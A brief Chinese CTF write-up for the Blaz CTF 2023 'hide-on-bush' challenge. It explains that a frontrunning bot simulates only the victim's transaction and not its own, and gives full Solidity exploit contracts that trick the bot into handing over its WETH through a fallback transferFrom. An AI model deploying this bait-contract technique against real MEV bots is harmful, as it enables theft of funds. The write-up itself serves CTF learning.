一开始没看懂题目要干什么，参考了 https://github.com/Kaiziron/blaz_ctf_2023_solutions/blob/main/hide-on-bush.md

这里有一个 frontrun bot 尝试在用户发送有收益的交易时进行抢跑。漏洞点在 bot 只模拟执行了用户发送的交易，而没有确认自己发送的交易是不是有相同的收益。因此可以通过 `msg.sender` 或者 `tx.origin` 等的判断逻辑允许自己获得收益而转出 bot 的资产。

最后的 exp 步骤是先骗 bot 转出 500 WETH，再 claim 空投的 WETH

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract fakeAirdrop {
    address public owner;
    IWETH public weth;

    constructor(IWETH _weth) payable {
        require(msg.value == 1 ether, "value not 1 ether");
        weth = _weth;
        owner = msg.sender;
        weth.deposit{value: 1 ether}();
    }

    function claim1() public {
        weth.transfer(msg.sender, 1 ether);
    }
}

contract Exploit2 {
    address public owner;
    IWETH public weth;

    constructor(IWETH _weth) {
        weth = _weth;
        owner = msg.sender;
    }

    fallback() external payable {
        if (msg.sender != owner) {
            weth.transferFrom(msg.sender, owner, weth.balanceOf(msg.sender));
        }
    }
}

contract Exploit {
    Challenge public chal;
    IWETH public weth;
    FrontrunBot public bot;
    AirdropDistributor public airdropDistributor;
    address public owner;
    Exploit2 public exploit2;
    fakeAirdrop public fakeairdrop;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _chal) payable {
        require(msg.value == 1 ether, "value not 1 ether");
        chal = Challenge(_chal);
        weth = chal.weth();
        bot = chal.bot();
        airdropDistributor = chal.airdropDistributor();
        owner = msg.sender;
        exploit2 = new Exploit2(weth);
        fakeairdrop = new fakeAirdrop{value: 1 ether}(weth);
    }

    function trick() public {
        weth.approve(address(exploit2),type(uint256).max);
        address(exploit2).call("");
        fakeairdrop.claim1();
        weth.transfer(owner, weth.balanceOf(address(this)));
    }

    function hide() public {
        chal.claim("m3f80");
    }

    function drain() public onlyOwner {
        weth.transfer(owner, weth.balanceOf(address(this)));
    }
}
```

